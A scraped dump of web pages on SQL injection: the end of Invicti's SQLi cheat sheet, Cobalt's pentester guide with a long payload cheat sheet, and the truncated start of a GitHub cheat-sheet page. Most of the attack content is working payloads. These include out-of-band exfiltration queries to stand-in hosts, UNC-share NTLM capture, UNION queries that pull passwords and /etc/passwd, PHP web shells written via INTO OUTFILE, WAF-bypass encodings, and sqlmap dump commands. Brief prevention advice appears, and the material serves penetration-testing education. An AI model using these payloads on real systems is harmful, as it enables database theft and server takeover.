7) & 1, benchmark(100000,sha1('test')), 'false' );\nselect if( (ascii(substring(user(),1,1)) >> 7) & 1, benchmark(100000,sha1('test')), 'false' );\nCOMPRESS() : Useful for compressing data, especially when reading large binaries via blind SQL injections.\nWith a second-order SQL injection, your injected payload is stored somewhere by the application and then used somewhere, hopefully unfiltered because SQL injection wasn’t expected in that place. This is a common hidden layer problem.\nSay you have an application that lets you create some kind of user account. You can try this injection into the name field:\nName: ' + (SELECT TOP 1 password FROM users ) + ' Email: xx@xx.com\n' + (SELECT TOP 1 password FROM users ) + '\nWith this payload, if the application uses the name field value in an unsafe stored procedure, function, or process, it will store the first user’s password as your name.\nForcing SQL Server to get NTLM hashes\nThis attack can help you get the SQL Server user’s Windows password for the target server when your inbound connection is firewalled. This can be very useful during internal penetration tests.\nThe trick is to force SQL Server to connect to your Windows UNC share and then capture NTLM session data with a tool like Cain & Abel.\nBulk insert from a UNC Share (S)\nYou can bulk insert data not only from a file but also from a UNC share, which is useful here:\nBULK INSERT foo FROM '\\\\ your-ip-address \\C$\\x.txt'\nBULK INSERT foo FROM '\\\\ your-ip-address \\C$\\x.txt'\nAn out-of-band (OOB) SQL injection is done when you need to exfiltrate data through a different channel than you used for the injection. DNS is one of the most common out-of-band channels because DNS requests are rarely blocked.\nOut-of-band injections for SQL Server\nBoth examples will send a DNS resolution request to YOUR-INJECTION-HERE .example.com :\n?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ( YOUR-INJECTION-HERE )+'.example.com';'sa';'pwd', 'SELECT 1')\n?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ( YOUR-INJECTION-HERE )+'.example.com';'sa';'pwd', 'SELECT 1')\n?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\\\'+( YOUR-INJECTION-HERE )+'.example.com\\\\test.txt'; EXEC master..xp_dirtree @q\n?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\\\'+( YOUR-INJECTION-HERE )+'.example.com\\\\test.txt'; EXEC master..xp_dirtree @q\nOut-of-band injections for MySQL (Windows)\nThe next two payloads attempt to reach UNC shares, so they can only work on Windows operating systems (Linux does not natively support or resolve these). Additionally, this only works if the secure_file_priv setting is set to an empty string.\nSends a NBNS query request/DNS resolution request to YOUR-INJECTION-HERE .yourhost.com : ?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\\\\\',( YOUR-INJECTION-HERE ), 'example.com\\\\')))\n?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\\\\\',( YOUR-INJECTION-HERE ), 'example.com\\\\')))\nWrites data to your shared folder or file: ?vulnerableParam=-99 OR (SELECT ( YOUR-INJECTION-HERE ) INTO OUTFILE '\\\\\\\\example.com\\\\share\\\\output.txt')\n?vulnerableParam=-99 OR (SELECT ( YOUR-INJECTION-HERE ) INTO OUTFILE '\\\\\\\\example.com\\\\share\\\\output.txt')\nOut-of-band injections for Oracle\nSending results to your logger application: ?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/log.php?response='||( YOUR-INJECTION-HERE )||'') FROM DUAL)\n?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/log.php?response='||( YOUR-INJECTION-HERE )||'') FROM DUAL)\nSaving results in your HTTP access logs: ?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ '||( YOUR-INJECTION-HERE )||'.html') FROM DUAL)\n?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ '||( YOUR-INJECTION-HERE )||'.html') FROM DUAL)\nTwo ways of sending results in DNS resolution requests (that you can log) to yourhost.com : ?vulnerableParam=(SELECT UTL_INADDR.get_host_addr(( YOUR-INJECTION-HERE )||'.example.com') FROM DUAL) ?vulnerableParam=(SELECT SYS.DBMS_LDAP.INIT(( YOUR-INJECTION-HERE )||'.example.com',80) FROM DUAL)\n?vulnerableParam=(SELECT UTL_INADDR.get_host_addr(( YOUR-INJECTION-HERE )||'.example.com') FROM DUAL)\n?vulnerableParam=(SELECT SYS.DBMS_LDAP.INIT(( YOUR-INJECTION-HERE )||'.example.com',80) FROM DUAL)\nSQL injection vulnerability classifications and severities\nFerruh Mavituna is the founder and CEO of Invicti Security, a world leader in web application vulnerability scanning. His professional obsessions lie in web application security research, automated vulnerability detection, and exploitation features. He has authored several web security research papers and tools and delivers animated appearances at cybersecurity conferences and on podcasts. Exuberant at the possibilities open to organizations by the deployment of automation, Ferruh is keen to demonstrate what can be achieved in combination with Invicti’s award-winning products, Netsparker and Acunetix.\nWhat is an SQL Injection (SQLi)? Prevention, Examples, Attacks\nThe Dark Web: Black Market Websites, Script Kiddies, Hacking and more...\nHTTP security headers: An easy way to harden your web applications\nHow you can disable directory listing on your web server – and why you should\nInvicti Security Corp 1000 N Lamar Blvd Suite 300 Austin, TX 78703, US\nRESOURCES Features Integrations Plans Case Studies Release Notes Invicti Learn\nUSE CASES Penetration Testing Software Website Security Scanner Ethical Hacking Software Web Vulnerability Scanner Comparisons Online Application Scanner\nWEB SECURITY The Problem with False Positives Why Pay for Web Scanners SQL Injection Cheat Sheet Getting Started with Web Security Vulnerability Index Content Security Policy (CSP) Directives, Examples, Fixes\nThe Problem with False Positives\nGetting Started with Web Security\nContent Security Policy (CSP) Directives, Examples, Fixes\nCOMPARISON Acunetix vs. Invicti Burp Suite vs. Invicti Checkmarx vs. Invicti Probely vs. Invicti Qualys vs. Invicti Tenable Nessus vs. Invicti\nCOMPANY About Us Contact Us Documentation Careers Resources Partners\nBy using this website you agree with our use of cookies to improve its performance and enhance your experience. More information in our Privacy Policy .",
    "source": "https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/",
    "metadata": {
      "title": "Invicti SQLi Cheat Sheet"
    }
  },
  {
    "content": "Platform Cobalt Platform Modern offensive security platform and pioneers in penetration testing as a service (PTaaS) Offensive Security Program Go beyond one-off pentests with a continuous program of testing, fix validation, and strategic guidance. PTaaS On-demand penetration testing as a service platform. Start a pentest in as little as 24 hours Integrations Automate workflows to identify and remediate vulnerabilities faster Cobalt Core Meet the community of skilled and highly-vetted penetration testing experts Why Cobalt Explore why customers love working with Cobalt for their offensive security service needs Pricing Explore the flexible Cobalt credit model for all your penetration testing needs State of Pentesting Report Learn what 10 years of pentesting data tells us about addressing risks Download now\nServices Pentest Services Proactively identify and mitigate risks with penetration testing services Pentest Services Web Applications Pentest AI & LLM Pentest Internal Network Pentest External Network Pentest Application Security Modern penetration testing services for fast-moving product development teams Secure Code Review Dynamic Application Security Testing Network & Cloud Security Penetration testing across your perimeter and into the cloud Cloud Configuration Review Attack Surface management InfoSec & SOC Services Test your system defenses against real-world attacks Red Teaming Digital Risk Assessment Services Overview Secure your organization with our expert security services Learn more\nDynamic Application Security Testing\nSolutions By Use Case Go beyond one-off pentests with a continuous program of testing, fix validation, and strategic guidance Application Security Information Security Developer Compliance Small Business Enterprise Solutions Overview Explore cybersecurity solutions to meet your specific needs Learn more\nResources Resource Library Essential reading and toolkits for modern cybersecurity professionals Blog Sharpen your skills with expert commentary and practical security advice Events and Webinars Live and on-demand training for today's most pressing security challenges Case Studies Explore real customer stories and see their delight straight from the source The Responsible AI Imperative Discover the security challenges of AI adoption and how to address them. Download now\nAbout Leadership Meet the executive leadership team driving our mission Partners Explore the Cobalt partnership network and apply to become a partner today Newsroom Read the latest news stories and press coverage Trust Center Transparency is important. See our approach to data privacy, security, and compliance About Us Learn how Cobalt infuses manual security testing with speed, simplicity, and transparency Careers Join Cobalt to help us redefine and reimagine offensive security Contact Us Get in touch with a member of our team Pentesting in 2025 A strategic guide to choosing the right security partner Download now\nPlatform Cobalt Platform Modern offensive security platform and pioneers in penetration testing as a service (PTaaS) Offensive Security Program Go beyond one-off pentests with a continuous program of testing, fix validation, and strategic guidance. PTaaS On-demand penetration testing as a service platform. Start a pentest in as little as 24 hours Integrations Automate workflows to identify and remediate vulnerabilities faster Cobalt Core Meet the community of skilled and highly-vetted penetration testing experts Why Cobalt Explore why customers love working with Cobalt for their offensive security service needs Pricing Explore the flexible Cobalt credit model for all your penetration testing needs State of Pentesting Report Learn what 10 years of pentesting data tells us about addressing risks Download now\nServices Pentest Services Proactively identify and mitigate risks with penetration testing services Pentest Services Web Applications Pentest AI & LLM Pentest Internal Network Pentest External Network Pentest Application Security Modern penetration testing services for fast-moving product development teams Secure Code Review Dynamic Application Security Testing Network & Cloud Security Penetration testing across your perimeter and into the cloud Cloud Configuration Review Attack Surface management InfoSec & SOC Services Test your system defenses against real-world attacks Red Teaming Digital Risk Assessment Services Overview Secure your organization with our expert security services Learn more\nDynamic Application Security Testing\nSolutions By Use Case Go beyond one-off pentests with a continuous program of testing, fix validation, and strategic guidance Application Security Information Security Developer Compliance Small Business Enterprise Solutions Overview Explore cybersecurity solutions to meet your specific needs Learn more\nResources Resource Library Essential reading and toolkits for modern cybersecurity professionals Blog Sharpen your skills with expert commentary and practical security advice Events and Webinars Live and on-demand training for today's most pressing security challenges Case Studies Explore real customer stories and see their delight straight from the source The Responsible AI Imperative Discover the security challenges of AI adoption and how to address them. Download now\nAbout Leadership Meet the executive leadership team driving our mission Partners Explore the Cobalt partnership network and apply to become a partner today Newsroom Read the latest news stories and press coverage Trust Center Transparency is important. See our approach to data privacy, security, and compliance About Us Learn how Cobalt infuses manual security testing with speed, simplicity, and transparency Careers Join Cobalt to help us redefine and reimagine offensive security Contact Us Get in touch with a member of our team Pentesting in 2025 A strategic guide to choosing the right security partner Download now\nA Pentester’s Guide to SQL Injection (SQLi)\nThis blog will be one of many created alongside our Hacking How-To series , an educational video series around everyday pentest findings. The first installment will explore SQL Injection.\nWhat SQL Injection is and how to spot it\nSQL injection is a code injection technique for applications with a database connection. The malicious user sends a crafted SQL query to extract, add, modify, or delete data from the database.\nLet’s imagine that you are using the search feature of an application, using the following keyword to search: apple\n__https://vulnerableURL.com/images?search=apple__\n__https://vulnerableURL.com/images?search=apple__\nThe following SQL query is sent in the background:\n__SELECT * from fruits WHERE name=’apple’__\n__SELECT * from fruits WHERE name=’apple’__\nYou add a single quote in your search like ?search=apple’ and the following query is sent. The query structure is broken:\n__SELECT * from fruits WHERE name='apple''__\n__SELECT * from fruits WHERE name='apple''__\nFrom there, the attacker writes a UNION SQL query for the search to take control of the SQL query and extract information it wasn’t intended to.\n__?search=apple’ UNION SELECT username, password FROM users —__ __SELECT * from fruits WHERE name=’apple’’ UNION SELECT username, password FROM users —__\n__?search=apple’ UNION SELECT username, password FROM users —__ __SELECT * from fruits WHERE name=’apple’’ UNION SELECT username, password FROM users —__\nIn this circumstance, username and password data from the users table is extracted rather than the intended results.\nSQL Injections are highly critical issues as these can be used to extract complete database contents and, in some cases, can be leveraged to a Command execution on the server. Related payloads for these attacks are given in the cheatsheet below.\nHow do I prevent SQL Injection?\nTo prevent SQL Injections, ensure that proper server-side input validation is performed on all sources of user input. Various protections should be implemented using the following in order of effectiveness:\nErrors: Ensure that SQL errors are turned off and not reflected back to a user when an error occurs as to not expose valuable information to an attacker.\nErrors: Ensure that SQL errors are turned off and not reflected back to a user when an error occurs as to not expose valuable information to an attacker.\nParameterize Queries: Ensure that when a userŐs input is added to a backend SQL query, it is not string appended but placed into the specific SQL parameter. The method to perform this varies from language to language.\nParameterize Queries: Ensure that when a userŐs input is added to a backend SQL query, it is not string appended but placed into the specific SQL parameter. The method to perform this varies from language to language.\nServer-Side Input Length: Limit the length of each field depending on its type. For example, a name should be less than 16 characters long, and an ID should be less than 5 characters long.\nServer-Side Input Length: Limit the length of each field depending on its type. For example, a name should be less than 16 characters long, and an ID should be less than 5 characters long.\nWhitelist: Create character ranges (ie. Numeric, alpha, alphanumeric, alphanumeric with specific characters) and ensure that each input is restricted to the minimum length whitelist necessary.\nWhitelist: Create character ranges (ie. Numeric, alpha, alphanumeric, alphanumeric with specific characters) and ensure that each input is restricted to the minimum length whitelist necessary.\nBlacklist: Disallow common injection characters such as “<>/?*()&, SQL and SCRIPT commands such as SELECT, INSERT, UPDATE, DROP, and SCRIPT, newlines %0A, carriage returns %0D, null characters %00 and unnecessary or bad encoding schemas (malformed ASCII, UTF-7, UTF-8, UTF-16, Unicode, etc.).\nBlacklist: Disallow common injection characters such as “<>/?*()&, SQL and SCRIPT commands such as SELECT, INSERT, UPDATE, DROP, and SCRIPT, newlines %0A, carriage returns %0D, null characters %00 and unnecessary or bad encoding schemas (malformed ASCII, UTF-7, UTF-8, UTF-16, Unicode, etc.).\nLogging and Web Specific IDS/IPS (Intrusion Detection/Prevention System): Ensure that proper logging is taking place and is being reviewed, and any malicious traffic which generates an alert is promptly throttled and eventually blacklisted.\nLogging and Web Specific IDS/IPS (Intrusion Detection/Prevention System): Ensure that proper logging is taking place and is being reviewed, and any malicious traffic which generates an alert is promptly throttled and eventually blacklisted.\nBelow you will find my cheatsheet for exploiting SQL Injection:\nString Concatenation & Comments\n--------------|--------------------|-----------|-------------------- | MySQL | MySQL | PostgreSQL --------------|--------------------|-----------|-------------------- String Concat:| 'foo' 'bar' |'foo'+'bar'| 'foo'||'bar' | CONCAT('foo','bar')| | --------------|--------------------|-----------|------------------- Comments: | # | -- | -- | -- | /*aaa*/ | /*aaa*/ | -- - | | | /*aaa*/ | | --------------|--------------------|-----------|-------------------- | Oracle --------------|----------------------------------------------------- String Concat:| 'foo'||'bar | CONCAT('foo','bar') --------------|----------------------------------------------------- Comments: | -- | --------------|-----------------------------------------------------\n--------------|--------------------|-----------|-------------------- | MySQL | MySQL | PostgreSQL --------------|--------------------|-----------|-------------------- String Concat:| 'foo' 'bar' |'foo'+'bar'| 'foo'||'bar' | CONCAT('foo','bar')| | --------------|--------------------|-----------|------------------- Comments: | # | -- | -- | -- | /*aaa*/ | /*aaa*/ | -- - | | | /*aaa*/ | | --------------|--------------------|-----------|-------------------- | Oracle --------------|----------------------------------------------------- String Concat:| 'foo'||'bar | CONCAT('foo','bar') --------------|----------------------------------------------------- Comments: | -- | --------------|-----------------------------------------------------\n-----------|-------------------------------------------------------- Detection: | aa' -- | aa' # | aa'/* | ' or 1=1-- | ' or 1=1# | ' or 1=1/* | ') or '1'='1-- | ') or ('1'='1-- -----------|-------------------------------------------------------- Number | ?id=1 order by <number> # of columns:| (Keep increasing number until you get an error, | the last number that doesn’t give you an error | is the # of columns) -----------|-------------------------------------------------------- Version: | ?id=1 union select 1,version(),3,4 # | id=1 UNION SELECT null,@@version,null,null | id=3 and substring(@@version,1,1)=4 | id=3 and substring(@@version,1,1)=5 | id=3 union all select 1,2,@@version,4/* -----------|-------------------------------------------------------- Current | ?id=1 union select 1,2,user(),4 # users: | SELECT user(); **(Mysql)** | SELECT system_user(); **(Mysql, MSSQL)** | SELECT user_name(); **(MSSQL)** | SELECT user; **(MSSQL, PostgreSQL)** | SELECT current_user; **(PostgreSQL)** | SELECT user FROM dual **(Oracle)** | ') or ('1'='1-- -----------|-------------------------------------------------------- Tables: | ?id=2 union select 1,table_name,3,4 | from information_schema.tables | SELECT * FROM information_schema.tables **(MySQL)** | SELECT * FROM information_schema.tables **(MSSQL)** | SELECT * FROM information_schema.tables **(PostgreSQL)** | SELECT * FROM all_tables **(Oracle)** -----------|-------------------------------------------------------- Columns: | ?id=2 union select 1,column_name,3,4 from | information_schema.columns where table_name='users' | SELECT * FROM information_schema.columns | WHERE table_name = 'table-name' **(MySQL)** | SELECT * FROM information_schema.columns | WHERE table_name = 'table-name' **(MSSQL)** | SELECT * FROM information_schema.columns | WHERE table_name = 'table-name' **(PostgreSQL)** | SELECT * FROM all_tab_columns | WHERE table_name = 'table-name' **(Oracle)** -----------|-------------------------------------------------------- Time-Based:| SELECT sleep(10) **(MySQL) | WAITFOR DELAY ‘0:0:10’ **(MSSQL) | SELECT pg_sleep(10) **(PostgreSQL) | dbms_pipe.receive_message((‘a’),10) **(Oracle) -----------|-------------------------------------------------------- Blind | ?id=3 Injection: | ?id=3 and 1=1 **(no error) | ?id=3 and 1=2 **(error) -----------|-------------------------------------------------------- Extracting | cat.php?id=2 union select Data: | 1,**concat(**login,0x3a,password**)**,3,4 from users -------------------------------------------------------------------- Reading files: ‘ union select 1,2,3, load_file(‘/etc/passwd’) ,5,6,7,8 — - ‘ union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 — - ‘ union select 1,2,3, load_file(‘/var/www/includes/config.inc.php’) ,5,6,7,8 — - ‘ union select 1,2,3, load_file(‘/var/www/mysqli_connect.php’) ,5,6,7,8 — - -------------------------------------------------------------------- Uploading files: ‘ union select 1,2,3, ‘this is a test message’ ,5,6,7,8 into outfile ‘/var/www/test’ — - ‘ union select 1,2,3, load_file(‘/var/www/test’) ,5,6,7,8 — - ‘ union select null,null,null, “<?php system($_GET[‘cmd’]) ?>” ,5,6,7,8 into outfile ‘/var/www/shell.php’ — - ‘ union select null,null,null, load_file(‘/var/www/shell.php’) ,5,6,7,8 — - -------------------------------------------------------------------- Command Execution: # windows ?id=1 union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6,7,8,9 into OUTFILE ‘c:/xampp/htdocs/cmd.php’ # linux ?id=1 union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6,7,8,9 into OUTFILE ‘/var/www/html/cmd.php’ -------------------------------------------------------------------\n-----------|-------------------------------------------------------- Detection: | aa' -- | aa' # | aa'/* | ' or 1=1-- | ' or 1=1# | ' or 1=1/* | ') or '1'='1-- | ') or ('1'='1-- -----------|-------------------------------------------------------- Number | ?id=1 order by <number> # of columns:| (Keep increasing number until you get an error, | the last number that doesn’t give you an error | is the # of columns) -----------|-------------------------------------------------------- Version: | ?id=1 union select 1,version(),3,4 # | id=1 UNION SELECT null,@@version,null,null | id=3 and substring(@@version,1,1)=4 | id=3 and substring(@@version,1,1)=5 | id=3 union all select 1,2,@@version,4/* -----------|-------------------------------------------------------- Current | ?id=1 union select 1,2,user(),4 # users: | SELECT user(); **(Mysql)** | SELECT system_user(); **(Mysql, MSSQL)** | SELECT user_name(); **(MSSQL)** | SELECT user; **(MSSQL, PostgreSQL)** | SELECT current_user; **(PostgreSQL)** | SELECT user FROM dual **(Oracle)** | ') or ('1'='1-- -----------|-------------------------------------------------------- Tables: | ?id=2 union select 1,table_name,3,4 | from information_schema.tables | SELECT * FROM information_schema.tables **(MySQL)** | SELECT * FROM information_schema.tables **(MSSQL)** | SELECT * FROM information_schema.tables **(PostgreSQL)** | SELECT * FROM all_tables **(Oracle)** -----------|-------------------------------------------------------- Columns: | ?id=2 union select 1,column_name,3,4 from | information_schema.columns where table_name='users' | SELECT * FROM information_schema.columns | WHERE table_name = 'table-name' **(MySQL)** | SELECT * FROM information_schema.columns | WHERE table_name = 'table-name' **(MSSQL)** | SELECT * FROM information_schema.columns | WHERE table_name = 'table-name' **(PostgreSQL)** | SELECT * FROM all_tab_columns | WHERE table_name = 'table-name' **(Oracle)** -----------|-------------------------------------------------------- Time-Based:| SELECT sleep(10) **(MySQL) | WAITFOR DELAY ‘0:0:10’ **(MSSQL) | SELECT pg_sleep(10) **(PostgreSQL) | dbms_pipe.receive_message((‘a’),10) **(Oracle) -----------|-------------------------------------------------------- Blind | ?id=3 Injection: | ?id=3 and 1=1 **(no error) | ?id=3 and 1=2 **(error) -----------|-------------------------------------------------------- Extracting | cat.php?id=2 union select Data: | 1,**concat(**login,0x3a,password**)**,3,4 from users -------------------------------------------------------------------- Reading files: ‘ union select 1,2,3, load_file(‘/etc/passwd’) ,5,6,7,8 — - ‘ union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 — - ‘ union select 1,2,3, load_file(‘/var/www/includes/config.inc.php’) ,5,6,7,8 — - ‘ union select 1,2,3, load_file(‘/var/www/mysqli_connect.php’) ,5,6,7,8 — - -------------------------------------------------------------------- Uploading files: ‘ union select 1,2,3, ‘this is a test message’ ,5,6,7,8 into outfile ‘/var/www/test’ — - ‘ union select 1,2,3, load_file(‘/var/www/test’) ,5,6,7,8 — - ‘ union select null,null,null, “<?php system($_GET[‘cmd’]) ?>” ,5,6,7,8 into outfile ‘/var/www/shell.php’ — - ‘ union select null,null,null, load_file(‘/var/www/shell.php’) ,5,6,7,8 — - -------------------------------------------------------------------- Command Execution: # windows ?id=1 union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6,7,8,9 into OUTFILE ‘c:/xampp/htdocs/cmd.php’ # linux ?id=1 union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6,7,8,9 into OUTFILE ‘/var/www/html/cmd.php’ -------------------------------------------------------------------\n-----------|-------------------------------------------------------- Replacing | **/**/ Space: | + | /*! */ | /*!50000 */ | /*!1234 */ | /*--*/ -----------|-------------------------------------------------------- Bypass | uNiOn (change upper-lower case) filters for| unUNIONion (write words in the keyword) keywords: | %55nIoN %53eLeCt (URL encode letters - U & S in these | cases) | Add followings around the words | **/*!50000**XXXXXX***/** /*!50000UniON SeLeCt*/ -----------|-------------------------------------------------------- Version: | ?id=1 union select 1,version(),3,4 # | id=1 UNION SELECT null,@@version,null,null | id=3 and substring(@@version,1,1)=4 | id=3 and substring(@@version,1,1)=5 | id=3 union all select 1,2,@@version,4/* -----------|-------------------------------------------------------- # of | **/**/**ORDER**/**/**BY**/**/** columns: | **/*!**order***/+/***!by***/ (By order) | **/*!**ORDER BY***/** | **/*!50000**ORDER BY***/ | /*!50000**ORDER***//**//*!50000**BY***/ | /*!12345**ORDER***/+/*!**BY***/** -------------------------------------------------------------------- SQLMAP - Use Tamper Scripts to Bypass WAF: sqlmap -r login.req --dbms=mysql --level 3 --risk 3 --timeout 100 --flush-session --technique=B --time-sec=2 --dbs --threads 10 --tamper=between,informationschemacomment,bluecoat,charencode --drop-set-cookie --fresh-queries --binary-fields -identify-waf ------------------------------------------------------------------- SQLMAP - Tamper Scripts: tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes ------------------------------------------------------------------- SQLMAP - MSSQL Tamper Scripts: tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes ------------------------------------------------------------------- SQLMAP - MYSQL Tamper Scripts: tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --------------------------------------------------------------------\n-----------|-------------------------------------------------------- Replacing | **/**/ Space: | + | /*! */ | /*!50000 */ | /*!1234 */ | /*--*/ -----------|-------------------------------------------------------- Bypass | uNiOn (change upper-lower case) filters for| unUNIONion (write words in the keyword) keywords: | %55nIoN %53eLeCt (URL encode letters - U & S in these | cases) | Add followings around the words | **/*!50000**XXXXXX***/** /*!50000UniON SeLeCt*/ -----------|-------------------------------------------------------- Version: | ?id=1 union select 1,version(),3,4 # | id=1 UNION SELECT null,@@version,null,null | id=3 and substring(@@version,1,1)=4 | id=3 and substring(@@version,1,1)=5 | id=3 union all select 1,2,@@version,4/* -----------|-------------------------------------------------------- # of | **/**/**ORDER**/**/**BY**/**/** columns: | **/*!**order***/+/***!by***/ (By order) | **/*!**ORDER BY***/** | **/*!50000**ORDER BY***/ | /*!50000**ORDER***//**//*!50000**BY***/ | /*!12345**ORDER***/+/*!**BY***/** -------------------------------------------------------------------- SQLMAP - Use Tamper Scripts to Bypass WAF: sqlmap -r login.req --dbms=mysql --level 3 --risk 3 --timeout 100 --flush-session --technique=B --time-sec=2 --dbs --threads 10 --tamper=between,informationschemacomment,bluecoat,charencode --drop-set-cookie --fresh-queries --binary-fields -identify-waf ------------------------------------------------------------------- SQLMAP - Tamper Scripts: tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes ------------------------------------------------------------------- SQLMAP - MSSQL Tamper Scripts: tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes ------------------------------------------------------------------- SQLMAP - MYSQL Tamper Scripts: tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --------------------------------------------------------------------\nFor more details on how to bypass a WAF you can check out my new video series Hacking How-To: SQL Injection (SQLi) All-in-One Part 2:\n------------------------------------------------------------------- Crawl the page: sqlmap -u http://.. --dbms=mysql --crawl=3 sqlmap -u http://<targetip> --forms --batch --crawl=10 --cookie=jsessionid=54321 --level 4 --risk 3 ------------------------------------------------------------------- Specify parameter in the saved request file: sqlmap -r login.req -p Password --dbms=mssql -v 3 --batch --level 5 --risk 3 ------------------------------------------------------------------- List DBs: sqlmap -r request.txt --level 4 --risk 3 --dbms=mysql --batch -p <parameter> --dbs ------------------------------------------------------------------- List tables: sqlmap -r request.txt --level 4 --risk 3 --dbms=mysql --batch -p <parameter> -D <dbname> --tables -------------------------------------------------------------------- Dump column data: sqlmap -r request.txt --level 4 --risk 3 --dbms=mysql --batch -p <parameter> -D <dbname> -T <tables> --dump -------------------------------------------------------------------- Force usage of SSL/HTTPS: python sqlmap.py -r a.req --force-ssl --users --------------------------------------------------------------------\n------------------------------------------------------------------- Crawl the page: sqlmap -u http://.. --dbms=mysql --crawl=3 sqlmap -u http://<targetip> --forms --batch --crawl=10 --cookie=jsessionid=54321 --level 4 --risk 3 ------------------------------------------------------------------- Specify parameter in the saved request file: sqlmap -r login.req -p Password --dbms=mssql -v 3 --batch --level 5 --risk 3 ------------------------------------------------------------------- List DBs: sqlmap -r request.txt --level 4 --risk 3 --dbms=mysql --batch -p <parameter> --dbs ------------------------------------------------------------------- List tables: sqlmap -r request.txt --level 4 --risk 3 --dbms=mysql --batch -p <parameter> -D <dbname> --tables -------------------------------------------------------------------- Dump column data: sqlmap -r request.txt --level 4 --risk 3 --dbms=mysql --batch -p <parameter> -D <dbname> -T <tables> --dump -------------------------------------------------------------------- Force usage of SSL/HTTPS: python sqlmap.py -r a.req --force-ssl --users --------------------------------------------------------------------\nFor a walkthrough on how to exploit a SQLi vulnerability using SQLmap check out my new video series, Hacking How-To: SQL Injection (SQLi) All-in-One Part 1:\nSome Explanations for sqlmap options:\n— batch: Never ask for user input, use the default behavior\n— crawl: Crawl the website starting from the target URL\n— level: Level of tests to perform (1–5, default 1)\n— risk: Risk of tests to perform (1–3, default 1)\n— dbms: Force back-end DBMS to provided value\n— dump: Dump DBMS database table entries\n— force-ssl: Force usage of SSL/HTTPS\nFor more options, please refer to the official sqlmap guide: https://github.com/sqlmapproject/sqlmap/wiki/Usage\nAlso, read more Pentester's Guides with the Guide to Command Injection available here .\nPlatform Platform DAST PTaaS ASM Pricing\nServices Pentest Application Security Network Security Cloud Security InfoSec & SOC Services Device Security All Services\nSolutions Secure SDLC Information Security Developer Compliance Offensive Security Program Small Business\nHelpful Links Product Document Resources Blog Events and Webinars Vulnerability Wiki Trust Center",
    "source": "https://www.cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli",
    "metadata": {
      "title": "Cobalt SQLi Guide"
    }
  },
  {
    "content": "Product GitHub Copilot Write better code with AI GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog\nGitHub Copilot Write better code with AI\nGitHub Models New Manage and compare prompts\nGitHub Advanced Security Find and fix vulnerabilities\nCodespaces Instant dev environments\nCode Review Manage code changes\nDiscussions Collaborate outside of code\nCode Search Find more, search less\nSolutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions\nResources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights\nOpen Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections\nGitHub Sponsors Fund open source developers\nThe ReadME Project GitHub community articles\nEnterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support\nEnterprise platform AI-powered developer platform\nGitHub Advanced Security Enterprise-grade security features\nCopilot for business Enterprise-grade AI features\nPremium Support Enterprise-grade 24/7 support\nSearch code, repositories, users, issues, pull requests...\nWe read every piece of feedback, and take your input very seriously.\nUse saved searches to filter your results more quickly\nTo see all available qualifiers, see our documentation .\nNotifications You must be signed in to change notification settings\nCheatsheet to exploit and learn SQL Injection.\nSecurity Uh oh! There was an error while loading. Please reload this page .\nThere was an error while loading. Please reload this page .\nThere was an error while loading. Please reload this page .\nAdmiralGaust/SQL-Injection-cheat-sheet\nFirst try to 